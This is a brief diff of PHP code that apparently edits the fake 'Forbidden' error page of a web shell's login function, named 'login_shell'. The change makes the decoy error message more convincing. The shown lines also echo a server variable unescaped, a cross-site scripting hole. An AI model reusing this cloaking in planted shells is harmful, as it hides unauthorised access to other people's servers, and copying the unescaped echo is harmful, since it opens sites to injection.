@@ -65,10 +65,10 @@ function login_shell()
 <head>
 <h1>Forbidden</h1>
 <p>You don't have permission to access <?php
-	echo $_SERVER['REQUEST_URI'];
+	echo $_SERVER['PHP_SELF'];
 	?>
  on this server.</p>
-<p>Additionally, a 404 Not Found error was encountered while trying to
+<p>Additionally, a 403 Forbidden error was encountered while trying to
 	use an ErrorDocument to handle the request.</p>
 </head>
 <?php
